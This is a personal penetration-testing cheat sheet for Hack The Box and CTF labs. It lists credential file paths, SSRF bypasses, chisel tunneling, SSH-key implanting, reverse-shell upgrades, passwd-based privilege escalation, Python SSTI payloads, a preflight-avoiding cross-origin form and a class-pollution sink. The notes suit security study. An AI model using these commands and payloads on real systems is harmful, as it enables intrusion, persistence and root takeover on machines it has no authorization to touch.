# Table of Content
<!-- TOC -->

- [Table of Content](#table-of-content)
- [Useful stuff](#useful-stuff)
    - [Paths](#paths)
    - [Tools](#tools)
    - [Commands](#commands)
    - [Port Forwarding](#port-forwarding)
    - [Websites](#websites)
    - [Implanting SSH keys](#implanting-ssh-keys)
    - [Transferring files with SCP](#transferring-files-with-scp)
    - [Reverse Shell Upgrade](#reverse-shell-upgrade)
    - [Privilege Escalation](#privilege-escalation)
- [Enumeration and footholds](#enumeration-and-footholds)
- [Notes from older exploits](#notes-from-older-exploits)
    - [git Directory](#git-directory)
    - [PHP filter_var Bypass](#php-filter_var-bypass)
    - [Nmap privilege escalation](#nmap-privilege-escalation)
    - [Python subclass - SSTI - code editor - arbitrary code execution](#python-subclass---ssti---code-editor---arbitrary-code-execution)
    - [CSS Injection](#css-injection)
    - [SSTI](#ssti)
        - [Cross Origin problems](#cross-origin-problems)
        - [Jinja2](#jinja2)
    - [Class Pollution](#class-pollution)

<!-- /TOC -->
# Useful stuff
## Paths
[lfi list](https://github.com/hussein98d/LFI-files/blob/master/list.txt)\
/etc/nginx/nginx.conf\
/etc/nginx/sites-enabled/(deafult)\
/etc/nginx/sites-available\
/etc/hosts\
$HOME/.shh/id_rsa\
/proc/self/environ\
/proc/self/cmdline\
/etc/shadow\
/etc/apache2/apache2.conf

Nella root della webApp:\
index.js/html\
main.js/html

## Tools
gitleaks\
pspy\
ghidra\
gobuster\
smbscan\
wpscan\
hashcat\
johntheripper\
nmap\
searchsploit - metasploit\
chisel

## Commands
netstat -antp\
sudo -l\
sudo -i\
whoami\
linpeas - WINpeas\
find / -perm -4000 2>/dev/null

Bypass ip filter or perform SSRF to localhost:
1. http://localtest.me
2. Append to url: .nip.io

ngrok tcp 80\
`dig` to resolve your tunnel hostname and use ip instead

## Port Forwarding
when you find a service on a machine running only locally you can forward it to your local port using: 
- when you already have ssh (user):
  ```bash
  ssh -L 9090:localhost:8080 remote_user@host.htb
  ```
  then visiting `localhost:9090` you can access the service on host.htb:8080 (might need to add domain to /etc/hosts). Example: [exploit.](../hack_the_box/htb_machines/sightless/writeup.md)

- CHISEL: when you dont have ssh but a simple remote shell

  - ON YOUR MACHINE: 
  ```
  chisel server -p s_chisel_port --reverse
  ```
  - ON TARGET MACHINE: 
  ```
  chisel client your_ip:s_chisel_port R:tunnel_port:localhost:service_port_to_forward
  ```

  then you access the service you wanted to forward by visiting `http://localhost:tunnel_port` on your browser



## Websites
bypass local security restriction: https://gtfobins.github.io/ \
payload: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md \
https://book.hacktricks.xyz/ \
intercept and modify requests, public endpoint:
- https://pipedream.com/requestbin 
- https://webhook.site/#!/view/36d22d40-393f-4680-a239-cf0d7488e238 
- https://testt.free.beeceptor.com

hash cracking: https://crackstation.net/

## Implanting SSH keys
`echo "Your SSH public key here (id_rsa.pub)" > /home/<user>/.ssh/authorized_keys`

## Transferring files with SCP
from destination to source:
`scp path_file_to_send dest_user@dest_ip:/path_to_receive`

from source to destination:
`scp dest_user@dest_ip:/path_to_receive files_received `

## Reverse Shell Upgrade
when you get a shell through nc, it's usually not possibile to use arrow keys so it's needed a "shell upgrade" as following:

    python3 -c 'import pty; pty.spawn("/bin/bash")' 
    ctrl + z 
    stty raw -echo; fg 
    Enter twice 
 
additionally: \
`export TERM=xterm`

additionally: (to fix terminal when writing very long payloads)\
`stty -a`  on own machine to read rows and columns values\
`stty rows ** columns **`  using same values seen on own machine

## Privilege Escalation

 - if you can modify perms of a file with sudo, you can create a symlink to passwd e grant yoursef perms to W and add a user with perms to root like "test::0:0:test:/root:/bin/bash".  Example: [exploit.](../hack_the_box/htb_challenges/web/NextPath/writeup.md)
 - if you can do something with `sudo -l` and the commands is set with a `*` which is a regex, you can execute that commands with all the options you want.
 - if you can write files or run tools as sudo that have the options to sync files (so write files as sudo) you can modify `/etc/passwd` to add a super user like root: [example.](https://labex.io/tutorials/explore-privilege-escalation-via-etc-passwd-file-in-nmap-416141)

# Enumeration and footholds

- Vhost enumeration
- Dir enumeration
- SQL injection on all params
- Path traversal (LFI or RFI)
- STTI (injected all special chars and typical payloads on all params)
- Search for version and CVE / exploit of software / languages used

# Notes from older exploits
bypass http blacklist filter with `dict://` `gopher://`
test antivirus or signature check using EICAR Files
  
## .git Directory
check its status with `git status` and maybe restore it with `git restore`. Often times there are secret hidden inside older commits, particularly in modified or new files.\
useful tool `gitdumper`
## PHP filter_var Bypass
https://medium.com/@themiddleblue/php-ssrf-techniques-9d422cb28d51 \
notes from older [exploit.](../hack_the_box/htb_challenges/web/Interstellar/exploit/exploit.py)
## Nmap privilege escalation
aside from the things you can do listed on GTFObins, there is an option `--datadir` that lets you modify the default dir of scripts, so you can create a custom script that will be executed with default options like `-sV` or `-sC` or `-p`\
references from ChatGPT:

changing `nmap-mac-prefixes` and executing `sudo nmap -O 127.0.0.1`\
changing `nmap-services` and executing  `sudo nmap -p 9999 127.0.0.1`\
changing `nmap-payloads` and executing  `sudo nmap -p 135 127.0.0.1`\
changing `nse_main.lua`	and executing  `sudo nmap -sV 127.0.0.1`\
changing `nse_main.lua`	and executing  `sudo nmap -sV 127.0.0.1`

## Python subclass - SSTI - code editor - arbitrary code execution

when having the chance to execute Python code, try the classic code execution methods:
- `import os; os.system('command')`
- `eval()` / `exec()`

if you are able to access the subclass list with something like `''.__class__.__mro__[1].__subclasses__()` then look for class like `subprocess.Popen` and calculate its index, then exploit it like this:\
`''.__class__.mro()[1].__subclasses__()[369]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()` 

look for similar payload in research about vulnerabilities like SSTI in Python. Example: [exploit.](../hack_the_box/htb_machines/code/rce.py)

## CSS Injection
when page header are set like font: None *
## SSTI
### Cross Origin problems
when trying to exploit it causing Cross Origin requests, the PREFLIGHT requests is automatically sent, that if not correctly handled might break the SSTI (even if AllowOrigin: *). To avoid sending the preflight use host a server that replies with the following:

```html
<html>
  <body>
    <form
      action="http://target/endpoint"
      method="POST"
      enctype="text/plain"
    >
      <input
        type="hidden"
        name='{"key_example": "value_example"'
        value='"}'
      />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Example: [exploit.](../hack_the_box/htb_challenges/web/TornadoService/writeup.md)

### Jinja2
bypass blacklisted character: https://ctf.zeyu2001.com/2022/securinets-ctf-finals-2022/strong \
using filter to get arguments from url or headers or form (if it is a post) which contains desidered blacklisted char\
example: https://github.com/Gianlush/Workspace_Ethical_Hacking/tree/main/hack_the_box/htb_challenges/web/DoxPit - `request|attr('args')|list|last`

Example: [exploit.](../hack_the_box/htb_challenges/web/DoxPit/writeup.md)

## Class Pollution 

```python
# Vulenrable function
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

Example: [exploit.](../hack_the_box/htb_challenges/web/TornadoService/writeup.md)
